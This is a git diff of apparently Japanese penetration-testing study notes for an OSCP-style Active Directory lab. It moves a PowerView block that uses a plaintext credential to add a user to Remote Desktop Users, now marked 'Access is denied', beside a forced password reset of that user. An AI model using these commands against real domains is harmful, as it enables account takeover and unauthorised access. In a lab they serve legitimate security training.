@@ -317,14 +317,6 @@ $NewPassword = ConvertTo-SecureString "Password123" -AsPlainText -Force
 Set-DomainUserPassword -Identity "CN=g.jarvis,CN=Users,DC=oscp,DC=exam" -AccountPassword $NewPassword
 ```
 
-- グループにも追加しておく
-```powershell
-$SecPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('OSCP.EXAM\r.andrews', $SecPassword)
-
-Add-DomainGroupMember -Identity 'CN=Remote Desktop Users,CN=Builtin,DC=oscp,DC=exam' -Members 'CN=g.jarvis,CN=Users,DC=oscp,DC=exam' -Credential $Cred
-```
-
 - パスワード変更に成功
 ```powershell
 ┌──(koshi㉿kali)-[~/Exam/AD/WS26]
@@ -341,6 +333,16 @@ Info: Establishing connection to remote endpoint
 
 ```
 ![[Pasted image 20260222164424.png]]
+
+
+- グループへの追加はAccess is denied
+```powershell
+$SecPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('OSCP.EXAM\r.andrews', $SecPassword)
+
+Add-DomainGroupMember -Identity 'CN=Remote Desktop Users,CN=Builtin,DC=oscp,DC=exam' -Members 'CN=g.jarvis,CN=Users,DC=oscp,DC=exam' -Credential $Cred
+```
+
 
 
 ---
